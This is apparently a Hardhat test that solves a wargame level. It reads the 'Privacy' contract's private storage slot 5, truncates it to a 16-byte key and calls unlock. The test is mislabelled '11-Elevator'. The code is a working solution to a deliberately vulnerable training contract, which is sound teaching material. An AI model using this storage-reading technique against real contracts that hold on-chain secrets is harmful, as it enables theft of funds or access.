const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Privacy");
  const challengeAddress = await createChallenge(`0x131c3249e115491E83De375171767Af07906eA36`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 11-Elevator", async function () {
  const challenge = await getChallenge();

  const data = await challenge.runner.provider.getStorage(await challenge.getAddress(), 5);
  const key = data.substr(0, 34);
  const bytes16 = ethers.getBytes(key);

  tx = await challenge.unlock(bytes16);
  await tx.wait();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
